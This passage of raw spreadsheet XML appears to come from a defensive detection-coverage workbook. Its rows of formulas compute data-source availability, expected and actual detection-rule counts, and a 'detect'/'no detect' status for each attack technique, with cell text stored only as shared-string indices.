        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M160" s="9" cm="1">
        <f t="array" ref="M160">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N160" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O160" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P160" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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60" t="s">
        <v>368</v>
      </c>
      <c r="U160" t="s">
        <v>1019</v>
      </c>
      <c r="V160" t="s">
        <v>1020</v>
      </c>
      <c r="W160" t="b">
        <v>1</v>
      </c>
      <c r="X160" t="s">
        <v>1008</v>
      </c>
    </row>
    <row r="161" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A161" t="s">
        <v>1008</v>
      </c>
      <c r="B161" t="s">
        <v>1021</v>
      </c>
      <c r="C161" t="s">
        <v>1022</v>
      </c>
      <c r="D161" t="s">
        <v>8</v>
      </c>
      <c r="E161" t="s">
        <v>463</v>
      </c>
      <c r="F161" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G161" s="9" cm="1">
        <f t="array" ref="G161">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H161" s="9" t="str" cm="1">
        <f t="array" ref="H161">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I161" s="9" t="str" cm="1">
        <f t="array" ref="I161">IF(SUM(IF($C161=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C161=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J161" s="9" t="str" cm="1">
        <f t="array" ref="J16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61" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M161" s="9" cm="1">
        <f t="array" ref="M161">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N161" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O161" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P161" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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61" t="s">
        <v>1023</v>
      </c>
      <c r="U161" t="s">
        <v>1024</v>
      </c>
      <c r="V161" t="s">
        <v>885</v>
      </c>
      <c r="W161" t="b">
        <v>1</v>
      </c>
      <c r="X161" t="s">
        <v>1008</v>
      </c>
    </row>
    <row r="162" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A162" t="s">
        <v>1008</v>
      </c>
      <c r="B162" t="s">
        <v>1025</v>
      </c>
      <c r="C162" t="s">
        <v>245</v>
      </c>
      <c r="D162" t="s">
        <v>8</v>
      </c>
      <c r="E162" t="s">
        <v>406</v>
      </c>
      <c r="F162" s="9">
        <f t="shared" si="2"/>
        <v>1</v>
      </c>
      <c r="G162" s="9" cm="1">
        <f t="array" ref="G162">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H162" s="9" t="str" cm="1">
        <f t="array" ref="H162">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I162" s="9" t="str" cm="1">
        <f t="array" ref="I162">IF(SUM(IF($C162=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C162=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J162" s="9" t="str" cm="1">
        <f t="array" ref="J16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62" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M162" s="9" cm="1">
        <f t="array" ref="M162">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N162" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O162" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P162" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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62" t="s">
        <v>517</v>
      </c>
      <c r="U162" t="s">
        <v>1026</v>
      </c>
      <c r="V162" t="s">
        <v>1027</v>
      </c>
      <c r="W162" t="b">
        <v>1</v>
      </c>
      <c r="X162" t="s">
        <v>1008</v>
      </c>
    </row>
    <row r="163" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A163" t="s">
        <v>1028</v>
      </c>
      <c r="B163" t="s">
        <v>1028</v>
      </c>
      <c r="C163" t="s">
        <v>169</v>
      </c>
      <c r="D163" t="s">
        <v>11</v>
      </c>
      <c r="E163" t="s">
        <v>1029</v>
      </c>
      <c r="F163" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G163" s="9" cm="1">
        <f t="array" ref="G163">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H163" s="9" cm="1">
        <f t="array" ref="H163">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I163" s="9" t="str" cm="1">
        <f t="array" ref="I163">IF(SUM(IF($C163=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C163=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J163" s="9" cm="1">
        <f t="array" ref="J16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163" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M163" s="9" cm="1">
        <f t="array" ref="M163">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N163" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O163" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P163" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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63" t="s">
        <v>425</v>
      </c>
      <c r="U163" t="s">
        <v>1030</v>
      </c>
      <c r="V163" t="s">
        <v>1031</v>
      </c>
      <c r="W163" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="164" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A164" t="s">
        <v>1028</v>
      </c>
      <c r="B164" t="s">
        <v>1032</v>
      </c>
      <c r="C164" t="s">
        <v>1033</v>
      </c>
      <c r="D164" t="s">
        <v>11</v>
      </c>
      <c r="E164" t="s">
        <v>1029</v>
      </c>
      <c r="F164" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G164" s="9" cm="1">
        <f t="array" ref="G164">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H164" s="9" t="str" cm="1">
        <f t="array" ref="H164">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I164" s="9" t="str" cm="1">
        <f t="array" ref="I164">IF(SUM(IF($C164=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C164=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J164" s="9" t="str" cm="1">
        <f t="array" ref="J16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64" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M164" s="9" cm="1">
        <f t="array" ref="M164">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N164" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O164" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P164" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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64" t="s">
        <v>425</v>
      </c>
      <c r="U164" t="s">
        <v>1034</v>
      </c>
      <c r="V164" t="s">
        <v>1035</v>
      </c>
      <c r="W164" t="b">
        <v>1</v>
      </c>
      <c r="X164" t="s">
        <v>1028</v>
      </c>
    </row>
    <row r="165" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A165" t="s">
        <v>1028</v>
      </c>
      <c r="B165" t="s">
        <v>1036</v>
      </c>
      <c r="C165" t="s">
        <v>1037</v>
      </c>
      <c r="D165" t="s">
        <v>11</v>
      </c>
      <c r="E165" t="s">
        <v>1029</v>
      </c>
      <c r="F165" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G165" s="9" cm="1">
        <f t="array" ref="G165">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H165" s="9" t="str" cm="1">
        <f t="array" ref="H165">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I165" s="9" t="str" cm="1">
        <f t="array" ref="I165">IF(SUM(IF($C165=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C165=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J165" s="9" t="str" cm="1">
        <f t="array" ref="J16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65" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M165" s="9" cm="1">
        <f t="array" ref="M165">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N165" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O165" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P165" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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65" t="s">
        <v>425</v>
      </c>
      <c r="U165" t="s">
        <v>1038</v>
      </c>
      <c r="V165" t="s">
        <v>1039</v>
      </c>
      <c r="W165" t="b">
        <v>1</v>
      </c>
      <c r="X165" t="s">
        <v>1028</v>
      </c>
    </row>
    <row r="166" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A166" t="s">
        <v>1028</v>
      </c>
      <c r="B166" t="s">
        <v>1040</v>
      </c>
      <c r="C166" t="s">
        <v>1041</v>
      </c>
      <c r="D166" t="s">
        <v>11</v>
      </c>
      <c r="E166" t="s">
        <v>1029</v>
      </c>
      <c r="F166" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G166" s="9" cm="1">
        <f t="array" ref="G166">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H166" s="9" t="str" cm="1">
        <f t="array" ref="H166">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I166" s="9" t="str" cm="1">
        <f t="array" ref="I166">IF(SUM(IF($C166=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C166=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J166" s="9" t="str" cm="1">
        <f t="array" ref="J16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66" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M166" s="9" cm="1">
        <f t="array" ref="M166">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N166" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O166" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P166" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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66" t="s">
        <v>425</v>
      </c>
      <c r="U166" t="s">
        <v>1042</v>
      </c>
      <c r="V166" t="s">
        <v>1043</v>
      </c>
      <c r="W166" t="b">
        <v>1</v>
      </c>
      <c r="X166" t="s">
        <v>1028</v>
      </c>
    </row>
    <row r="167" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A167" t="s">
        <v>1028</v>
      </c>
      <c r="B167" t="s">
        <v>1044</v>
      </c>
      <c r="C167" t="s">
        <v>262</v>
      </c>
      <c r="D167" t="s">
        <v>11</v>
      </c>
      <c r="E167" t="s">
        <v>367</v>
      </c>
      <c r="F167" s="9">
        <f t="shared" si="2"/>
        <v>1</v>
      </c>
      <c r="G167" s="9" cm="1">
        <f t="array" ref="G167">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H167" s="9" t="str" cm="1">
        <f t="array" ref="H167">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I167" s="9" t="str" cm="1">
        <f t="array" ref="I167">IF(SUM(IF($C167=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C167=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J167" s="9" t="str" cm="1">
        <f t="array" ref="J16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67" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M167" s="9" cm="1">
        <f t="array" ref="M167">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N167" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O167" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P167" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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67" t="s">
        <v>368</v>
      </c>
      <c r="U167" t="s">
        <v>1045</v>
      </c>
      <c r="V167" t="s">
        <v>1046</v>
      </c>
      <c r="W167" t="b">
        <v>1</v>
      </c>
      <c r="X167" t="s">
        <v>1028</v>
      </c>
    </row>
    <row r="168" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A168" t="s">
        <v>1047</v>
      </c>
      <c r="B168" t="s">
        <v>1047</v>
      </c>
      <c r="C168" t="s">
        <v>85</v>
      </c>
      <c r="D168" t="s">
        <v>1048</v>
      </c>
      <c r="E168" t="s">
        <v>1049</v>
      </c>
      <c r="F168" s="9">
        <f t="shared" si="2"/>
        <v>4</v>
      </c>
      <c r="G168" s="9" cm="1">
        <f t="array" ref="G168">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H168" s="9" cm="1">
        <f t="array" ref="H168">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I168" s="9" t="str" cm="1">
        <f t="array" ref="I168">IF(SUM(IF($C168=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C168=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J168" s="9" t="str" cm="1">
        <f t="array" ref="J16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68" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M168" s="9" cm="1">
        <f t="array" ref="M168">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N168" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O168" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P168" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S16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68" t="s">
        <v>386</v>
      </c>
      <c r="U168" t="s">
        <v>1050</v>
      </c>
      <c r="V168" t="s">
        <v>1051</v>
      </c>
      <c r="W168" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="169" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A169" t="s">
        <v>1052</v>
      </c>
      <c r="B169" t="s">
        <v>1052</v>
      </c>
      <c r="C169" t="s">
        <v>36</v>
      </c>
      <c r="D169" t="s">
        <v>11</v>
      </c>
      <c r="E169" t="s">
        <v>1053</v>
      </c>
      <c r="F169" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G169" s="9" cm="1">
        <f t="array" ref="G169">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H169" s="9" cm="1">
        <f t="array" ref="H169">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I169" s="9" t="str" cm="1">
        <f t="array" ref="I169">IF(SUM(IF($C169=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C169=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J169" s="9" t="str" cm="1">
        <f t="array" ref="J16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69" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M169" s="9" cm="1">
        <f t="array" ref="M169">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N169" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O169" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
